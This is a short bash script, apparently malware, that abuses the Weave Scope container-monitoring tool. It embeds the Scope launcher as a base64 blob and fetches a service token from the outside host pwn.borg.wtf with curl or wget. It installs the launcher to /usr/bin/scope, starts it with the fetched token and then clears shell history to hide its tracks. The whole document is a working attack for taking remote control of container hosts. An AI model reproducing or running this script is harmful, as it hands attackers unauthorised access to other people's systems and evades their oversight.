#!/bin/bash

SCOPEFILE='IyEvYmluL3NoCgpzZXQgLWV1CgpBUkdTPSIkKiIKU0NSSVBUX1ZFUlNJT049IjEuMTMuMSIKaWYgWyAiJFNDUklQVF9WRVJTSU9OIiA9ICIodW5yZWxlYXNlZCB2ZXJzaW9uKSIgXTsgdGhlbgogICAgSU1BR0VfVkVSU0lPTj1sYXRlc3QKZWxzZQogICAgSU1BR0VfVkVSU0lPTj0iJFNDUklQVF9WRVJTSU9OIgpmaQpJTUFHRV9WRVJTSU9OPSR7VkVSU0lPTjotJElNQUdFX1ZFUlNJT059CkRPQ0tFUkhVQl9VU0VSPSR7RE9DS0VSSFVCX1VTRVI6LXdlYXZld29ya3N9ClNDT1BFX0lNQUdFX05BTUU9IiRET0NLRVJIVUJfVVNFUi9zY29wZSIKU0NPUEVfSU1BR0U9IiRTQ09QRV9JTUFHRV9OQU1FOiRJTUFHRV9WRVJTSU9OIgojIENhcmVmdWw6IGl0J3MgZWFzeSB0byBvcGVyYXRlIG9uIChlLmcuIHN0b3ApIHRoZSB3cm9uZyBzY29wZSBpbnN0YW5jZQojIHdoZW4gU0NPUEV7X0FQUCx9X0NPTlRBSU5FUl9OQU1FIHZhbHVlcyBkaWZmZXIgYmV0d2VlbiBydW5zLiBIYW5kbGUKIyB3aXRoIGNhcmUuClNDT1BFX0NPTlRBSU5FUl9OQU1FPSIke1NDT1BFX0NPTlRBSU5FUl9OQU1FOi13ZWF2ZXNjb3BlfSIKU0NPUEVfQVBQX0NPTlRBSU5FUl9OQU1FPSIke1NDT1BFX0FQUF9DT05UQUlORVJfTkFNRTotd2VhdmVzY29wZS1hcHB9IgpJUF9SRUdFWFA9IlswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM31cLlswLTldezEsM30iCklQX0FERFJfQ01EPSJmaW5kIC9zeXMvY2xhc3MvbmV0IC10eXBlIGwgfCB4YXJncyAtbjEgYmFzZW5hbWUgfCBncmVwIC12RSAnZG9ja2VyfHZldGh8bG8nIHwgXAogICAgeGFyZ3MgLW4xIGlwIGFkZHIgc2hvdyB8IGdyZXAgaW5ldCB8IGF3ayAneyBwcmludCBcJDIgfScgfCBncmVwIC1vRSAnJElQX1JFR0VYUCciCkxJU1RFTklOR19JUF9BRERSX0NNRD0iZm9yIEkgaW4gXCQoICRJUF9BRERSX0NNRCApOyBkbyBpZiBjdXJsIC1tIDEgLXMgXCR7SX06NDA0MCA+IC9kZXYvbnVsbCA7IHRoZW4gZWNobyBcJHtJfTsgZmk7IGRvbmUiCldFQVZFU0NPUEVfRE9DS0VSX0FSR1M9JHtXRUFWRVNDT1BFX0RPQ0tFUl9BUkdTOi19CgojIFdoZW4gZG9ja2VyIGRhZW1vbiBpcyBydW5uaW5nIHdpdGggVXNlciBOYW1lc3BhY2UgZW5hYmxlZCwgdGhpcyB0b29sIHdpbGwgcnVuIGludG8gZXJyb3JzOgojICAiUHJpdmlsZWdlZCBtb2RlIGlzIGluY29tcGF0aWJsZSB3aXRoIHVzZXIgbmFtZXNwYWNlcyIgZm9yIGBkb2NrZXIgcnVuIC0tcHJpdmlsZWdlZGAKIyAgIkNhbm5vdCBzaGFyZSB0aGUgaG9zdCdzIG5ldHdvcmsgbmFtZXNwYWNlIHdoZW4gdXNlciBuYW1lc3BhY2VzIGFyZSBlbmFibGVkIiBmb3IgYGRvY2tlciBydW4gLS1uZXQ9aG9zdGAKIyBUbyBhdm9pZCBhYm92ZSBlcnJvcnMsIHVzZSBgLS11c2VybnM9aG9zdGAgb3B0aW9uIHRvIGxldCBjb250YWluZXIgdXNlIGhvc3QgVXNlciBOYW1lc3BhY2UuCiMgVGhpcyBvcHRpb24oc2F2ZWQgaW4gJFVTRVJOU19IT1NUKSB3aWxsIGJlIGluc2VydGVkIE9OTFkgSUYgZG9ja2VyIHN1cHBvcnQgYC0tdXNlcm5zYCBvcHRpb24uClVTRVJOU19IT1NUPSIiCmRvY2tlciBydW4gLS1oZWxwIHwgZ3JlcCAtcSAtLSAtLXVzZXJucyAmJiBVU0VSTlNfSE9TVD0iLS11c2VybnM9aG9zdCIKCnVzYWdlKCkgewogICAgbmFtZT0kKGJhc2VuYW1lICIkMCIpCiAgICBjYXQgPiYyIDw8LUVPRgoJCVVzYWdlOgoJCSRuYW1lIGxhdW5jaCB7T1BUSU9OU30ge1BFRVJTfSAtIExhdW5jaCBTY29wZQoJCSRuYW1lIHN0b3AgICAgICAgICAgICAgICAgICAgICAtIFN0b3AgU2NvcGUKCQkkbmFtZSBjb21tYW5kICAgICAgICAgICAgICAgICAgLSBQcmludCB0aGUgZG9ja2VyIGNvbW1hbmQgdXNlZCB0byBzdGFydCBTY29wZQoJCSRuYW1lIGhlbHAgICAgICAgICAgICAgICAgICAgICAtIFByaW50IHVzYWdlIGluZm8KCQkkbmFtZSB2ZXJzaW9uICAgICAgICAgICAgICAgICAgLSBQcmludCB2ZXJzaW9uIGluZm8KCgkJUEVFUlMgYXJlIG9mIHRoZSBmb3JtIEhPU1RbOlBPUlRdCgkJSE9TVCBtYXkgYmUgYW4gaXAgb3IgaG9zdG5hbWUuCgkJUE9SVCBkZWZhdWx0cyB0byA0MDQwLgoKCQlMYXVuY2ggb3B0aW9uczoKCUVPRgogICAgZG9ja2VyIHJ1biAtLXJtIC0tZW50cnlwb2ludD0vaG9tZS93ZWF2ZS9zY29wZSAiJFNDT1BFX0lNQUdFIiAtaCA+JjIKfQoKdXNhZ2VfYW5kX2RpZSgpIHsKICAgIHVzYWdlCiAgICBleGl0IDEKfQoKWyAkIyAtZ3QgMCBdIHx8IHVzYWdlX2FuZF9kaWUKQ09NTUFORD0kMQpzaGlmdCAxCgpjaGVja19kb2NrZXJfYWNjZXNzKCkgewoKICAgICMgRXh0cmFjdCBzb2NrZXQgcGF0aAogICAgRE9DS0VSX1NPQ0tfRklMRT0iIgogICAgaWYgWyAteiAiJHtET0NLRVJfSE9TVCt4fSIgXTsgdGhlbgogICAgICAgIERPQ0tFUl9TT0NLX0ZJTEU9Ii92YXIvcnVuL2RvY2tlci5zb2NrIgogICAgZWxzZQogICAgICAgIFdJVEhPVVRfUFJFRklYPSIke0RPQ0tFUl9IT1NUI3VuaXg6Ly99IgogICAgICAgIGlmIFsgIiRXSVRIT1VUX1BSRUZJWCIgIT0gIiRET0NLRVJfSE9TVCIgXTsgdGhlbgogICAgICAgICAgICBET0NLRVJfU09DS19GSUxFPSIkV0lUSE9VVF9QUkVGSVgiCiAgICAgICAgZmkKICAgIGZpCgogICAgIyBzaGVsbGNoZWNrIGRpc2FibGU9U0MyMTY2CiAgICBpZiBbIFwoIC1uICIkRE9DS0VSX1NPQ0tfRklMRSIgXCkgLWEgXCggISAtdyAiJERPQ0tFUl9TT0NLX0ZJTEUiIFwpIF07IHRoZW4KICAgICAgICBlY2hvICJFUlJPUjogY2Fubm90IHdyaXRlIHRvIGRvY2tlciBzb2NrZXQ6ICRET0NLRVJfU09DS19GSUxFIiA+JjIKICAgICAgICBlY2hvICJjaGFuZ2Ugc29ja2V0IHBlcm1pc3Npb25zIG9yIHRyeSB1c2luZyBzdWRvIiA+JjIKICAgICAgICBleGl0IDEKICAgIGZpCn0KCiMgLSBUaGUgaW1hZ2UgZW1iZWRzIHRoZSB3ZWF2ZSBzY3JpcHQgJiBEb2NrZXIgMS4xMy4xIGNsaWVudCAobWltaWNraW5nIGEgMS4xMCBjbGllbnQpCiMgLSBXZWF2ZSBuZWVkcyAxLjEwLjAgbm93IChpbWFnZSBwdWxsaW5nIGNoYW5nZXMpCk1JTl9ET0NLRVJfVkVSU0lPTj0xLjEwLjAKCmNoZWNrX2RvY2tlcl92ZXJzaW9uKCkgewogICAgaWYgISBET0NLRVJfVkVSU0lPTj0kKGRvY2tlciAtdiB8IHNlZCAtbiAncyVeRG9ja2VyIHZlcnNpb24gXChbMC05XVx7MSxcfVwuWzAtOV1cezEsXH1cLlswLTldXHsxLFx9XCkuKiQlXDElcCcpIFwKICAgICAgICB8fCBbIC16ICIkRE9DS0VSX1ZFUlNJT04iIF07IHRoZW4KICAgICAgICBlY2hvICJFUlJPUjogVW5hYmxlIHRvIHBhcnNlIGRvY2tlciB2ZXJzaW9uIiA+JjIKICAgICAgICBleGl0IDEKICAgIGZpCgogICAgRE9DS0VSX1ZFUlNJT05fTUFKT1I9JChlY2hvICIkRE9DS0VSX1ZFUlNJT04iIHwgY3V0IC1kLiAtZiAxKQogICAgRE9DS0VSX1ZFUlNJT05fTUlOT1I9JChlY2hvICIkRE9DS0VSX1ZFUlNJT04iIHwgY3V0IC1kLiAtZiAyKQogICAgRE9DS0VSX1ZFUlNJT05fUEFUQ0g9JChlY2hvICIkRE9DS0VSX1ZFUlNJT04iIHwgY3V0IC1kLiAtZiAzKQoKICAgIE1JTl9ET0NLRVJfVkVSU0lPTl9NQUpPUj0kKGVjaG8gIiRNSU5fRE9DS0VSX1ZFUlNJT04iIHwgY3V0IC1kLiAtZiAxKQogICAgTUlOX0RPQ0tFUl9WRVJTSU9OX01JTk9SPSQoZWNobyAiJE1JTl9ET0NLRVJfVkVSU0lPTiIgfCBjdXQgLWQuIC1mIDIpCiAgICBNSU5fRE9DS0VSX1ZFUlNJT05fUEFUQ0g9JChlY2hvICIkTUlOX0RPQ0tFUl9WRVJTSU9OIiB8IGN1dCAtZC4gLWYgMykKCiAgICAjIHNoZWxsY2hlY2sgZGlzYWJsZT1TQzIxNjYKICAgIGlmIFsgXCggIiRET0NLRVJfVkVSU0lPTl9NQUpPUiIgLWx0ICIkTUlOX0RPQ0tFUl9WRVJTSU9OX01BSk9SIiBcKSAtbyBcCiAgICAgICAgXCggIiRET0NLRVJfVkVSU0lPTl9NQUpPUiIgLWVxICIkTUlOX0RPQ0tFUl9WRVJTSU9OX01BSk9SIiAtYSBcCiAgICAgICAgXCggIiRET0NLRVJfVkVSU0lPTl9NSU5PUiIgLWx0ICIkTUlOX0RPQ0tFUl9WRVJTSU9OX01JTk9SIiAtbyBcCiAgICAgICAgXCggIiRET0NLRVJfVkVSU0lPTl9NSU5PUiIgLWVxICIkTUlOX0RPQ0tFUl9WRVJTSU9OX01JTk9SIiAtYSBcCiAgICAgICAgXCggIiRET0NLRVJfVkVSU0lPTl9QQVRDSCIgLWx0ICIkTUlOX0RPQ0tFUl9WRVJTSU9OX1BBVENIIiBcKSBcKSBcKSBcKSBdOyB0aGVuCiAgICAgICAgZWNobyAiRVJST1I6IHNjb3BlIHJlcXVpcmVzIERvY2tlciB2ZXJzaW9uICRNSU5fRE9DS0VSX1ZFUlNJT04gb3IgbGF0ZXI7IHlvdSBhcmUgcnVubmluZyAkRE9DS0VSX1ZFUlNJT04iID4mMgogICAgICAgIGV4aXQgMQogICAgZmkKfQoKY2hlY2tfcHJvYmVfb25seSgpIHsKICAgIGVjaG8gIiR7QVJHU30iIHwgZ3JlcCAtcSAtRSAiXC1cLW5vXC1hcHB8XC1cLXNlcnZpY2VcLXRva2VufFwtXC1wcm9iZVwtb25seSIKfQoKY2hlY2tfbGlzdGVuX2FkZHJlc3NfYXJnKCkgewogICAgZWNobyAiJHtBUkdTfSIgfCBncmVwIC1xIC1FICJcLVwtYXBwXC5odHRwXC5hZGRyZXNzIgp9CgpjaGVja19kb2NrZXJfZm9yX21hYygpIHsKICAgIFsgIiQodW5hbWUpIiA9ICJEYXJ3aW4iIF0gXAogICAgICAgICYmIFsgLVMgL3Zhci9ydW4vZG9ja2VyLnNvY2sgXSBcCiAgICAgICAgJiYgWyAhICIke0RPQ0tFUl9IT1NUK3h9IiA9IHggXSBcCiAgICAgICAgJiYgWyAiJHtIT01FK3h9IiA9IHggXSBcCiAgICAgICAgJiYgWyAtZCAiJHtIT01FfS9MaWJyYXJ5L0NvbnRhaW5lcnMvY29tLmRvY2tlci5kb2NrZXIvRGF0YSIgXQp9CgojIENoZWNrIHRoYXQgYSBjb250YWluZXIgbmFtZWQgJDEgd2l0aCBpbWFnZSAkMiBpcyBub3QgcnVubmluZwpjaGVja19ub3RfcnVubmluZygpIHsKICAgIGNhc2UgJChkb2NrZXIgaW5zcGVjdCAtLWZvcm1hdD0ne3suU3RhdGUuUnVubmluZ319IHt7LkNvbmZpZy5JbWFnZX19JyAiJDEiIDI+L2Rldi9udWxsKSBpbgogICAgICAgICJ0cnVlICQyIikKICAgICAgICAgICAgZWNobyAiJDEgaXMgYWxyZWFkeSBydW5uaW5nLiIgPiYyCiAgICAgICAgICAgIGV4aXQgMQogICAgICAgICAgICA7OwogICAgICAgICJ0cnVlICQyOiIqKQogICAgICAgICAgICBlY2hvICIkMSBpcyBhbHJlYWR5IHJ1bm5pbmcuIiA+JjIKICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgICAgIDs7CiAgICAgICAgImZhbHNlICQyIikKICAgICAgICAgICAgZG9ja2VyIHJtICIkMSIgPi9kZXYvbnVsbAogICAgICAgICAgICA7OwogICAgICAgICJmYWxzZSAkMjoiKikKICAgICAgICAgICAgZG9ja2VyIHJtICIkMSIgPi9kZXYvbnVsbAogICAgICAgICAgICA7OwogICAgICAgIHRydWUqKQogICAgICAgICAgICBlY2hvICJGb3VuZCBhbm90aGVyIHJ1bm5pbmcgY29udGFpbmVyIG5hbWVkICckMScuIEFib3J0aW5nLiIgPiYyCiAgICAgICAgICAgIGV4aXQgMQogICAgICAgICAgICA7OwogICAgICAgIGZhbHNlKikKICAgICAgICAgICAgZWNobyAiRm91bmQgYW5vdGhlciBjb250YWluZXIgbmFtZWQgJyQxJy4gQWJvcnRpbmcuIiA+JjIKICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgICAgIDs7CiAgICBlc2FjCn0KCmNyZWF0ZV9wbHVnaW5zX2RpcigpIHsKICAgICMgRG9ja2VyIGZvciBNYWMgKGFzIG9mIGJldGExOCkgbG9va3MgZm9yIHRoaXMgcGF0aCBvbiBWTSBmaXJzdCwgYW5kIHdoZW4gaXQgZG9lc24ndAogICAgIyBmaW5kIGl0IHRoZXJlLCBpdCBhc3N1bWVzIHRoZSB1c2VyIHJlZmVyZXMgdG8gdGhlIHBhdGggb24gTWFjIE9TLiBGaXJzdGx5LCBpbiBtb3N0CiAgICAjIGNhc2VzIHVzZXIgd29uJ3QgaGF2ZSAvdmFyL3J1bi9zY29wZS9wbHVnaW5zIG9uIHRoZWlyIE1hYyBPUyBmaWxlc3lzdGVtLCBhbmQKICAgICMgc2Vjb25kbHkgRG9ja2VyIGZvciBNYWMgd291bGQgaGF2ZSB0byBiZSBjb25maWd1cmVkIHRvIHNoYXJlIHRoaXMgcGF0aC4gVGhlIHJlc3VsdAogICAgIyBvZiB0aGlzICJmZWF0dXJlIiBpcyBhbiBlcnJvciBtZXNzYWdlOiAiVGhlIHBhdGggL3Zhci9ydW4vc2NvcGUvcGx1Z2lucwogICAgIyBpcyBub3Qgc2hhcmVkIGZyb20gT1MgWCBhbmQgZG9lcyBub3QgYmVsb25nIHRvIHRoZSBzeXN0ZW0uIgogICAgIyBJbiBhbnkgY2FzZSwgY3JlYXRpbmcgL3Zhci9ydW4vc2NvcGUvcGx1Z2lucyBvbiBNYWMgT1Mgd291bGQgbm90IHdvcmssIGFzIGRvbWFpbgogICAgIyBzb2NrZXRzIGRvIG5vdCBjcm9zcyBWTSBib3VuZGFyaWVzLiBXZSBuZWVkIHRoaXMgZGlyZWN0b3J5IHRvIGV4aXRzIG9uIHRoZSBWTS4KICAgIGRvY2tlciBydW4gJFVTRVJOU19IT1NUIC0tcm0gLS1lbnRyeXBvaW50PS9iaW4vc2ggXAogICAgICAgIC12IC92YXIvcnVuOi92YXIvcnVuIFwKICAgICAgICAiJFNDT1BFX0lNQUdFIiAtYyAibWtkaXIgLXAgL3Zhci9ydW4vc2NvcGUvcGx1Z2lucyIKfQoKZG9ja2VyX2FyZ3MoKSB7CiAgICBlY2hvIC0tcHJpdmlsZWdlZCAkVVNFUk5TX0hPU1QgLS1uZXQ9aG9zdCAtLXBpZD1ob3N0IFwKICAgICAgICAtdiAvdmFyL3J1bi9kb2NrZXIuc29jazovdmFyL3J1bi9kb2NrZXIuc29jayBcCiAgICAgICAgLXYgL3Zhci9ydW4vc2NvcGUvcGx1Z2luczovdmFyL3J1bi9zY29wZS9wbHVnaW5zIFwKICAgICAgICAtdiAvc3lzL2tlcm5lbC9kZWJ1Zzovc3lzL2tlcm5lbC9kZWJ1ZyBcCiAgICAgICAgLWUgQ0hFQ0tQT0lOVF9ESVNBQkxFCn0KCmxhdW5jaF9jb21tYW5kKCkgewogICAgIyBzaGVsbGNoZWNrIGRpc2FibGU9U0MyMDQ2LFNDMjA4NgogICAgZWNobyBkb2NrZXIgcnVuIC1kIC0tbmFtZT0iJFNDT1BFX0NPTlRBSU5FUl9OQU1FIiAkKGRvY2tlcl9hcmdzKSBcCiAgICAgICAgJFdFQVZFU0NPUEVfRE9DS0VSX0FSR1MgIiRTQ09QRV9JTUFHRSIgLS1wcm9iZS5kb2NrZXI9dHJ1ZQp9CgpsYXVuY2hfZG9ja2VyNG1hY19hcHBfY29tbWFuZCgpIHsKICAgICMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjA4NgogICAgZWNobyBkb2NrZXIgcnVuIC1kIC0tbmFtZT0iJFNDT1BFX0FQUF9DT05UQUlORVJfTkFNRSIgXAogICAgICAgIC1lIENIRUNLUE9JTlRfRElTQUJMRSBcCiAgICAgICAgLXAgMC4wLjAuMDo0MDQwOjQwNDAgXAogICAgICAgICRXRUFWRVNDT1BFX0RPQ0tFUl9BUkdTICIkU0NPUEVfSU1BR0UiIC0tbm8tcHJvYmUKfQoKbGF1bmNoKCkgewogICAgY2hlY2tfbm90X3J1bm5pbmcgIiRTQ09QRV9DT05UQUlORVJfTkFNRSIgIiRTQ09QRV9JTUFHRV9OQU1FIgogICAgZG9ja2VyIHJtIC1mICIkU0NPUEVfQ09OVEFJTkVSX05BTUUiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCiAgICAkKGxhdW5jaF9jb21tYW5kKSAiJEAiCiAgICBlY2hvICJTY29wZSBwcm9iZSBzdGFydGVkIgp9CgpwcmludF9hcHBfZW5kcG9pbnRzKCkgewogICAgSE9TVF9TVUZGSVg9IiIKICAgIGlmIFsgLW4gIiR7RE9DS0VSX0hPU1QreH0iIF07IHRoZW4KICAgICAgICBET0NLRVJfSE9TVE5BTUU9JChydW5faW5fc2NvcGVfY29udGFpbmVyIGhvc3RuYW1lKQogICAgICAgIEhPU1RfU1VGRklYPSIgb2YgaG9zdCAkRE9DS0VSX0hPU1ROQU1FIgogICAgZmkKICAgIGVjaG8gIldlYXZlIFNjb3BlIGlzIGxpc3RlbmluZyBhdCB0aGUgZm9sbG93aW5nIFVSTChzKSR7SE9TVF9TVUZGSVh9OiIgPiYyCiAgICBmb3IgaXAgaW4gIiRAIjsgZG8KICAgICAgICBlY2hvICIgICogaHR0cDovLyRpcDo0MDQwLyIgPiYyCiAgICBkb25lCn0KCmRyeV9ydW4oKSB7CiAgICAjIERvIGEgZHJ5IHJ1biBvZiBzY29wZSBpbiB0aGUgZm9yZWdyb3VuZCwgc28gaXQgY2FuIHBhcnNlIGFyZ3MgZXRjCiAgICAjIGF2b2lkaW5nIHRoZSBlbnRyeXBvaW50IHNjcmlwdCBpbiB0aGUgcHJvY2Vzcy4KICAgICMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjA0NgogICAgZG9ja2VyIHJ1biAtLXJtIC0tZW50cnlwb2ludD0vaG9tZS93ZWF2ZS9zY29wZSAkKGRvY2tlcl9hcmdzKSAiJFNDT1BFX0lNQUdFIiAtLWRyeS1ydW4gIiRAIgp9CgpydW5faW5fc2NvcGVfY29udGFpbmVyKCkgewogICAgZG9ja2VyIHJ1biAtLXJtICRVU0VSTlNfSE9TVCAtLW5ldD1ob3N0IC0tZW50cnlwb2ludCAvYmluL3NoICIkU0NPUEVfSU1BR0UiIC1jICIkMSIKfQoKIyBXYWl0IGZvciB0aGUgc2NvcGUgYXBwIHRvIHN0YXJ0IGxpc3RlbmluZyBvbiBsb2NhbGhvc3Q6NDA0MAp3YWl0X2Zvcl9odHRwKCkgewogICAgZm9yIHNlY29uZHMgaW4gJChzZXEgNSk7IGRvCiAgICAgICAgaWYgcnVuX2luX3Njb3BlX2NvbnRhaW5lciAiY3VybCAtbSAxIC1zIGxvY2FsaG9zdDo0MDQwIiA+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZmkKICAgICAgICBzbGVlcCAxCiAgICBkb25lCiAgICBpZiBbICIkc2Vjb25kcyIgLWVxIDUgXTsgdGhlbgogICAgICAgIGVjaG8gIlRoZSBTY29wZSBBcHAgaXMgbm90IHJlc3BvbmRpbmcuIENvbnN1bHQgdGhlIGNvbnRhaW5lciBsb2dzIGZvciBmdXJ0aGVyIGRldGFpbHMuIgogICAgICAgIGV4aXQgMQogICAgZmkKfQoKY2hlY2tfZG9ja2VyX2FjY2VzcwpjaGVja19kb2NrZXJfdmVyc2lvbgoKY2FzZSAiJENPTU1BTkQiIGluCiAgICBjb21tYW5kKQogICAgICAgICMgTW9zdCBzeXN0ZW1zIHNob3VsZCBoYXZlIHByaW50ZiwgYnV0IHRoZSAlcSBzcGVjaWZpZXIgaXNuJ3QgbWFuZGF0ZWQgYnkgcG9zaXgKICAgICAgICAjIGFuZCBjYW4ndCBiZSBndWFyYW50ZWVkLiBTaW5jZSB0aGlzIGlzIG1haW5seSBhIGNvc21ldGljIG91dHB1dCBhbmQgdGhlIGFsdGVybmF0aXZlCiAgICAgICAgIyBpcyBub3QgbWFraW5nIGFueSBhdHRlbXB0IHRvIGRvIGVzY2FwaW5nIGF0IGFsbCwgd2UgbWlnaHQgYXMgd2VsbCB0cnkuCiAgICAgICAgIyBzaGVsbGNoZWNrIGRpc2FibGU9U0MyMDM5CiAgICAgICAgcXVvdGVkPSQocHJpbnRmICclcSAnICIkQCIgMj4vZGV2L251bGwgfHwgdHJ1ZSkKICAgICAgICAjIHByaW50ZiAlcSBiZWhhdmVzIG9kZGx5IHdpdGggemVybyBhcmdzIChpdCBhY3RzIGFzIHRob3VnaCBpdCByZWNlaXZlZCBvbmUgZW1wdHkgYXJnKQogICAgICAgICMgc28gd2UgaWdub3JlIHRoYXQgY2FzZS4KICAgICAgICBpZiBbIC16ICIkcXVvdGVkIiBdIHx8IFsgJCMgLWVxIDAgXTsgdGhlbgogICAgICAgICAgICBxdW90ZWQ9IiQqIgogICAgICAgIGZpCiAgICAgICAgZWNobyAiJChsYXVuY2hfY29tbWFuZCkgJHF1b3RlZCIKICAgICAgICA7OwoKICAgIHZlcnNpb24pCiAgICAgICAgZG9ja2VyIHJ1biAtLXJtIC0tZW50cnlwb2ludD0vaG9tZS93ZWF2ZS9zY29wZSAiJFNDT1BFX0lNQUdFIiAtLW1vZGU9dmVyc2lvbgogICAgICAgIDs7CgogICAgLWggfCBoZWxwIHwgLWhlbHAgfCAtLWhlbHApCiAgICAgICAgdXNhZ2UKICAgICAgICA7OwoKICAgIGxhdW5jaCkKICAgICAgICBpZiBjaGVja19kb2NrZXJfZm9yX21hYzsgdGhlbgogICAgICAgICAgICBjcmVhdGVfcGx1Z2luc19kaXIKICAgICAgICAgICAgaWYgY2hlY2tfcHJvYmVfb25seTsgdGhlbgogICAgICAgICAgICAgICAgbGF1bmNoICIkQCIKICAgICAgICAgICAgICAgIGV4aXQKICAgICAgICAgICAgZmkKICAgICAgICAgICAgIyBEb2NrZXIgZm9yIE1hYyAoYXMgb2YgYmV0YTkpIGRvZXMgbm90IHNoaXAgdm1uZXQgZHJpdmVyIGFuZAogICAgICAgICAgICAjIHRoZXJlYnkgb25seSBhY2Nlc3MgY29udGFpbmVyIHBvcnRzIHZpYSBhIHR1bm5lbCwgcHJldmVudGluZwogICAgICAgICAgICAjIGFjY2VzcyB0byBob3N0IHBvcnRzIG9mIHRoZSBWTS4KICAgICAgICAgICAgIyAtIGh0dHBzOi8vZ2l0aHViLmNvbS93ZWF2ZXdvcmtzL3Njb3BlL2lzc3Vlcy8xNDExCiAgICAgICAgICAgICMgLSBodHRwczovL2ZvcnVtcy5kb2NrZXIuY29tL3QvcG9ydHMtaW4taG9zdC1uZXR3b3JrLW5hbWVzcGFjZS1hcmUtbm90LWFjY2Vzc2libGUvMTA3ODkKICAgICAgICAgICAgZHJ5X3J1biAiJEAiCiAgICAgICAgICAgIGlmIGNoZWNrX2xpc3Rlbl9hZGRyZXNzX2FyZzsgdGhlbgogICAgICAgICAgICAgICAgZWNobyAiLS1hcHAuaHR0cC5hZGRyZXNzIGFyZ3VtZW50IG5vdCBzdXBwb3J0ZWQgb24gRG9ja2VyIGZvciBNYWMiID4mMgogICAgICAgICAgICAgICAgZXhpdCAxCiAgICAgICAgICAgIGZpCiAgICAgICAgICAgIGNoZWNrX25vdF9ydW5uaW5nICIkU0NPUEVfQVBQX0NPTlRBSU5FUl9OQU1FIiAiJFNDT1BFX0lNQUdFX05BTUUiCiAgICAgICAgICAgIGNoZWNrX25vdF9ydW5uaW5nICIkU0NPUEVfQ09OVEFJTkVSX05BTUUiICIkU0NPUEVfSU1BR0VfTkFNRSIKICAgICAgICAgICAgZG9ja2VyIHJtIC1mICIkU0NPUEVfQVBQX0NPTlRBSU5FUl9OQU1FIiA+L2Rldi9udWxsIDI+JjEgfHwgdHJ1ZQogICAgICAgICAgICBDT05UQUlORVI9JCgkKGxhdW5jaF9kb2NrZXI0bWFjX2FwcF9jb21tYW5kKSAiJEAiKQogICAgICAgICAgICBlY2hvICJTY29wZSBwcm9iZSBzdGFydGVkIgogICAgICAgICAgICBhcHBfaXA9JChkb2NrZXIgaW5zcGVjdCAtZiAne3suTmV0d29ya1NldHRpbmdzLklQQWRkcmVzc319JyAiJHtDT05UQUlORVJ9IikKICAgICAgICAgICAgZG9ja2VyIHJtIC1mICIkU0NPUEVfQ09OVEFJTkVSX05BTUUiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCiAgICAgICAgICAgICMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjA5MQogICAgICAgICAgICBDT05UQUlORVI9JCgkKGxhdW5jaF9jb21tYW5kIC0tbm8tYXBwICIkQCIgIiR7YXBwX2lwfTo0MDQwIikpCiAgICAgICAgICAgIHByaW50X2FwcF9lbmRwb2ludHMgImxvY2FsaG9zdCIKICAgICAgICAgICAgZXhpdAogICAgICAgIGZpCiAgICAgICAgZHJ5X3J1biAiJEAiCiAgICAgICAgbGF1bmNoICIkQCIKICAgICAgICBpZiAhIGNoZWNrX3Byb2JlX29ubHk7IHRoZW4KICAgICAgICAgICAgaWYgY2hlY2tfbGlzdGVuX2FkZHJlc3NfYXJnOyB0aGVuCiAgICAgICAgICAgICAgICBlY2hvICJXZWF2ZSBTY29wZSBpcyBsaXN0ZW5pbmcgYXQgdGhlIGFkZHJlc3Mgc3BlY2lmaWVkIHdpdGggLS1hcHAuaHR0cC5hZGRyZXNzIiA+JjIKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgd2FpdF9mb3JfaHR0cAogICAgICAgICAgICAgICAgSVBfQUREUlM9JChydW5faW5fc2NvcGVfY29udGFpbmVyICIkTElTVEVOSU5HX0lQX0FERFJfQ01EIikKICAgICAgICAgICAgICAgICMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjA4NgogICAgICAgICAgICAgICAgcHJpbnRfYXBwX2VuZHBvaW50cyAkSVBfQUREUlMKICAgICAgICAgICAgZmkKICAgICAgICBmaQogICAgICAgIDs7CgogICAgc3RvcCkKICAgICAgICBbICQjIC1lcSAwIF0gfHwgdXNhZ2VfYW5kX2RpZQogICAgICAgIGlmIGRvY2tlciBpbnNwZWN0ICIkU0NPUEVfQ09OVEFJTkVSX05BTUUiID4vZGV2L251bGwgMj4mMTsgdGhlbgogICAgICAgICAgICBkb2NrZXIgc3RvcCAiJFNDT1BFX0NPTlRBSU5FUl9OQU1FIiA+L2Rldi9udWxsCiAgICAgICAgZmkKICAgICAgICBpZiBjaGVja19kb2NrZXJfZm9yX21hYzsgdGhlbgogICAgICAgICAgICBpZiBkb2NrZXIgaW5zcGVjdCAiJFNDT1BFX0FQUF9DT05UQUlORVJfTkFNRSIgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgICAgICAgICBkb2NrZXIgc3RvcCAiJFNDT1BFX0FQUF9DT05UQUlORVJfTkFNRSIgPi9kZXYvbnVsbAogICAgICAgICAgICBmaQogICAgICAgIGZpCiAgICAgICAgOzsKCiAgICAqKQogICAgICAgIGVjaG8gIlVua25vd24gc2NvcGUgY29tbWFuZCAnJENPTU1BTkQnIiA+JjIKICAgICAgICB1c2FnZV9hbmRfZGllCiAgICAgICAgOzsKCmVzYWMK'
SCOPEMYIP=$(curl -s http://pwn.borg.wtf/scope_id.dat || wget -q -O - http://pwn.borg.wtf/scope_id.dat)

if [ ! -f "/usr/bin/scope" ]; then echo $SCOPEFILE | base64 -d > /usr/bin/scope; chmod +x /usr/bin/scope; fi
scope stop 2>/dev/null
scope launch --service-token=$SCOPEMYIP

history -c
clear
